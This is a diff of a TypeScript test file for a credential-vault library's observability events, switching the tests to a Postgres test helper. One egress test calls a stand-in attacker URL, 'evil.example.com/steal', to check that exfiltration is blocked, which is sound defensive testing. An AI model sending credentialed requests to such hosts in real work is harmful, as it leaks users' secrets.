@@ -1,7 +1,7 @@
-import { test } from 'node:test';
+import { test, type TestContext } from 'node:test';
+import { openTestDb } from './support/pg';
 import assert from 'node:assert/strict';
 import { randomBytes } from 'node:crypto';
-import { openDb } from '../src/core/db';
 import { Vault } from '../src/core/vault';
 import { Audit } from '../src/core/audit';
 import { ConnectionHandle, type VouchrEvent } from '../src/core/injector';
@@ -15,8 +15,8 @@ const O1 = userOwner(ID);
 const TOKEN = 'tok_secret_xyz'; // the value that must never appear in any event
 
 // Build a handle wired to a sink that records every event, with a vaulted github cred.
-async function handleWithSink(sink: (e: VouchrEvent) => void) {
-  const db = await openDb({ dbPath: ':memory:' });
+async function handleWithSink(t: TestContext, sink: (e: VouchrEvent) => void) {
+  const db = await openTestDb(t);
   const vault = new Vault(db, KEY);
   const audit = new Audit(db);
   const provider = github({ clientId: 'cid', clientSecret: 'csec' }); // egressAllow: api.github.com
@@ -24,9 +24,9 @@ async function handleWithSink(sink: (e: VouchrEvent) => void) {
   return new ConnectionHandle(provider, O1, ID, vault, audit, {}, new Map(), sink);
 }
 
-test('observability: injected fires with host/status/ownerKind on a successful fetch', async () => {
+test('observability: injected fires with host/status/ownerKind on a successful fetch', async (t) => {
   const events: VouchrEvent[] = [];
-  const handle = await handleWithSink((e) => events.push(e));
+  const handle = await handleWithSink(t, (e) => events.push(e));
   const realFetch = globalThis.fetch;
   globalThis.fetch = (async () => new Response('{}', { status: 200, headers: { 'content-type': 'application/json' } })) as any;
   try {
@@ -47,14 +47,14 @@ test('observability: injected fires with host/status/ownerKind on a successful f
   assert.ok(Number.isFinite(ev.ms) && ev.ms >= 0, `bad latency: ${ev.ms}`);
 });
 
-test('observability: egress_denied fires AND the fetch still throws for a disallowed host', async () => {
+test('observability: egress_denied fires AND the fetch still throws for a disallowed host', async (t) => {
   const events: VouchrEvent[] = [];
-  const handle = await handleWithSink((e) => events.push(e));
+  const handle = await handleWithSink(t, (e) => events.push(e));
   await assert.rejects(() => handle.fetch('https://evil.example.com/steal'), /Egress blocked/);
   assert.deepEqual(events, [{ type: 'egress_denied', provider: 'github', host: 'evil.example.com', reason: 'host' }]);
 });
 
-test('observability: egress_denied carries the per-gate reason (host/method/path/validator)', async () => {
+test('observability: egress_denied carries the per-gate reason (host/method/path/validator)', async (t) => {
   const TICKET = randomBytes(32); // a secret that must never reach an event
   // A provider with all four finer egress gates wired, so each denial site is reachable.
   const provider = {
@@ -64,7 +64,7 @@ test('observability: egress_denied carries the per-gate reason (host/method/path
     egressValidate: (u: URL) => !u.searchParams.has('x'),
   };
   async function handleFor(p: any) {
-    const db = await openDb({ dbPath: ':memory:' });
+    const db = await openTestDb(t);
     const vault = new Vault(db, KEY);
     const audit = new Audit(db);
     await vault.upsert(O1, 'github', { accessToken: TOKEN, refreshToken: null, scopes: 'repo', expiresAt: null, externalAccount: null });
@@ -91,9 +91,9 @@ test('observability: egress_denied carries the per-gate reason (host/method/path
   }
 });
 
-test('observability: kms_decrypt counts real DEK unwraps and never leaks the secret', async () => {
+test('observability: kms_decrypt counts real DEK unwraps and never leaks the secret', async (t) => {
   const events: VouchrEvent[] = [];
-  const db = await openDb({ dbPath: ':memory:' });
+  const db = await openTestDb(t);
   // A fake KMS: XOR-wrap the DEK so unwrap is a real (counted) call but no SDK is needed.
   const KEK = randomBytes(32);
   const xor = (b: Buffer) => Buffer.from(b.map((x, i) => x ^ KEK[i % KEK.length]));
@@ -117,9 +117,9 @@ test('observability: kms_decrypt counts real DEK unwraps and never leaks the sec
   for (const e of events) assert.ok(!JSON.stringify(e).includes(TOKEN), 'event leaked token');
 });
 
-test('observability: no kms_decrypt event on the legacy (non-envelope) path', async () => {
+test('observability: no kms_decrypt event on the legacy (non-envelope) path', async (t) => {
   const events: VouchrEvent[] = [];
-  const handle = await handleWithSink((e) => events.push(e));
+  const handle = await handleWithSink(t, (e) => events.push(e));
   const realFetch = globalThis.fetch;
   globalThis.fetch = (async () => new Response('{}', { status: 200 })) as any;
   try {
@@ -130,9 +130,9 @@ test('observability: no kms_decrypt event on the legacy (non-envelope) path', as
   assert.ok(!events.some((e) => e.type === 'kms_decrypt'), 'legacy path must make no KMS call');
 });
 
-test('observability: no event ever carries a token, user id, or team id', async () => {
+test('observability: no event ever carries a token, user id, or team id', async (t) => {
   const events: VouchrEvent[] = [];
-  const handle = await handleWithSink((e) => events.push(e));
+  const handle = await handleWithSink(t, (e) => events.push(e));
   const realFetch = globalThis.fetch;
   globalThis.fetch = (async () => new Response('{}', { status: 200 })) as any;
   try {
@@ -150,9 +150,9 @@ test('observability: no event ever carries a token, user id, or team id', async 
   }
 });
 
-test('observability: refreshed carries a refresh-latency ms on a 401-triggered refresh', async () => {
+test('observability: refreshed carries a refresh-latency ms on a 401-triggered refresh', async (t) => {
   const events: VouchrEvent[] = [];
-  const db = await openDb({ dbPath: ':memory:' });
+  const db = await openTestDb(t);
   const vault = new Vault(db, KEY);
   const audit = new Audit(db);
   const acme = defineProvider({
@@ -183,9 +183,9 @@ test('observability: refreshed carries a refresh-latency ms on a 401-triggered r
   assert.ok(Number.isFinite(r.ms) && r.ms >= 0, `bad refresh latency: ${r.ms}`);
 });
 
-test('observability: a throwing refresh cancels the discarded 401 body and still propagates the error (#168)', async () => {
+test('observability: a throwing refresh cancels the discarded 401 body and still propagates the error (#168)', async (t) => {
   const events: VouchrEvent[] = [];
-  const db = await openDb({ dbPath: ':memory:' });
+  const db = await openTestDb(t);
   const vault = new Vault(db, KEY);
   const acme = defineProvider({
     id: 'acme', authorizeUrl: 'https://acme.example/auth', tokenUrl: 'https://acme.example/token',
@@ -214,8 +214,8 @@ test('observability: a throwing refresh cancels the discarded 401 body and still
   assert.equal(err.reason, 'refresh_failed');
 });
 
-test('observability: the discarded 401 body is cancelled on a successful refresh-retry too', async () => {
-  const db = await openDb({ dbPath: ':memory:' });
+test('observability: the discarded 401 body is cancelled on a successful refresh-retry too', async (t) => {
+  const db = await openTestDb(t);
   const vault = new Vault(db, KEY);
   const acme = defineProvider({
     id: 'acme', authorizeUrl: 'https://acme.example/auth', tokenUrl: 'https://acme.example/token',
@@ -246,9 +246,9 @@ test('observability: the discarded 401 body is cancelled on a successful refresh
   assert.ok(cancelled, 'discarded 401 body must be cancelled on the success path');
 });
 
-test('observability: kms_decrypt also counts the refresh-path reads on a 401-triggered refresh', async () => {
+test('observability: kms_decrypt also counts the refresh-path reads on a 401-triggered refresh', async (t) => {
   const events: VouchrEvent[] = [];
-  const db = await openDb({ dbPath: ':memory:' });
+  const db = await openTestDb(t);
   const KEK = randomBytes(32);
   const xor = (b: Buffer) => Buffer.from(b.map((x, i) => x ^ KEK[i % KEK.length]));
   let unwraps = 0;
@@ -286,8 +286,8 @@ test('observability: kms_decrypt also counts the refresh-path reads on a 401-tri
   assert.ok(kmsTotal >= 4, `expected refresh-path reads to be counted, got ${kmsTotal}`);
 });
 
-test('observability: a throwing sink does not break handle.fetch', async () => {
-  const handle = await handleWithSink(() => { throw new Error('bad sink'); });
+test('observability: a throwing sink does not break handle.fetch', async (t) => {
+  const handle = await handleWithSink(t, () => { throw new Error('bad sink'); });
   const realFetch = globalThis.fetch;
   globalThis.fetch = (async () => new Response('{}', { status: 200 })) as any;
   try {
